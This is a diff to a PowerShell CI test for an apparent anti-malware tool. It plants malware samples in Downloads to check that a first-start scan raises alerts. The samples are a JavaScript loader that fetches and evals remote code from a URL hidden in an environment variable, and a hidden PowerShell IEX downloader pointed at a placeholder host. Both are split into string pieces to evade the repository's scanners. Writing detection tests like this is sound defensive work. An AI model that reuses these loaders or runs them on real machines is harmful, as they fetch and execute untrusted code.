@@ -1,7 +1,8 @@
 # Runs docs/guard.ps1, the one-liner users paste into an elevated PowerShell,
 # on a CI runner against a guard.exe built from this commit (served from a local
 # web server instead of the latest release), then checks the installed Guard:
-# the GuardWatcher task runs, the watcher alerts on a malicious file dropped in
+# the GuardWatcher task runs, the first-start scan finds malware already in
+# Downloads before the install, the watcher alerts on a malicious file dropped in
 # Downloads, a reinstall over the running task works, and `guard uninstall`
 # removes the task.
 #
@@ -54,6 +55,21 @@ if ((Invoke-OneLiner 'bad') -eq 0) { Fail 'guard.ps1 succeeded with a wrong chec
 if (Test-Path $Bin) { Fail "guard.ps1 installed $Bin despite a checksum mismatch" }
 Write-Host "::endgroup::"
 
+# An already-infected machine: malware in Downloads before Guard is installed,
+# for the first-start scan to find. The loader is the incident's, and the
+# downloader script is a type only the antivirus engine reads; both split so
+# no line of this file carries them whole (the detection tests sweep the
+# repository).
+$downloads = Join-Path $env:USERPROFILE 'Downloads'
+New-Item -ItemType Directory -Force $downloads | Out-Null
+$payload = "const a = 1;`n(async () => {`n  const src = at" + "ob(process.env.AUTH_API_KEY);`n" +
+  "  const proxyInfo = await (await fetch(src)).text();`n  eval(proxy" + "Info);`n})();`n"
+$downloader = "powershell -WindowStyle Hid" + "den -ExecutionPolicy By" + "pass -c " +
+  "`"IEX (New-Object Net.WebClient).Download" + "String('http://example.invalid/a')`"`n"
+$pre = "guard-preinstalled-$(Get-Random)"
+[IO.File]::WriteAllText((Join-Path $downloads "$pre.js"), $payload)
+[IO.File]::WriteAllText((Join-Path $downloads "$pre.ps1"), $downloader)
+
 Write-Host "::group::guard.ps1"
 if ((Invoke-OneLiner 'good') -ne 0) { Fail 'guard.ps1 failed' }
 Write-Host "::endgroup::"
@@ -69,14 +85,17 @@ Wait-For 30 'the GuardWatcher task to run' { (Task-State) -eq 'Running' }
 # (the SYSTEM task watches every profile) raises an alert
 $log = "$SysHome\watcher.log"
 Wait-For 120 "the watcher to start ($log)" { Select-String -Path $log -Pattern 'native file events|polling every' -Quiet }
+try {
+  foreach ($f in "$pre.js", "$pre.ps1") {
+    Wait-For 300 "the first-start scan to alert on $f, there before the install" {
+      Select-String -Path "$SysHome\alerts.jsonl" -SimpleMatch $f -Quiet
+    }
+    Write-Host "first-start scan alerted on $f"
+  }
+  Wait-For 300 'the initial scan to finish' { Select-String -Path $log -SimpleMatch 'initial scan complete' -Quiet }
+} catch { Get-Content $log -Tail 50; throw }
 Start-Sleep -Seconds 2
-$downloads = Join-Path $env:USERPROFILE 'Downloads'
-New-Item -ItemType Directory -Force $downloads | Out-Null
 $name = "guard-ci-$(Get-Random).js"
-# the incident's loader, split so no line of this file carries it whole (the
-# detection tests sweep the repository)
-$payload = "const a = 1;`n(async () => {`n  const src = at" + "ob(process.env.AUTH_API_KEY);`n" +
-  "  const proxyInfo = await (await fetch(src)).text();`n  eval(proxy" + "Info);`n})();`n"
 [IO.File]::WriteAllText((Join-Path $downloads $name), $payload)
 try {
   Wait-For 120 "an alert for $name" { Select-String -Path "$SysHome\alerts.jsonl" -SimpleMatch $name -Quiet }
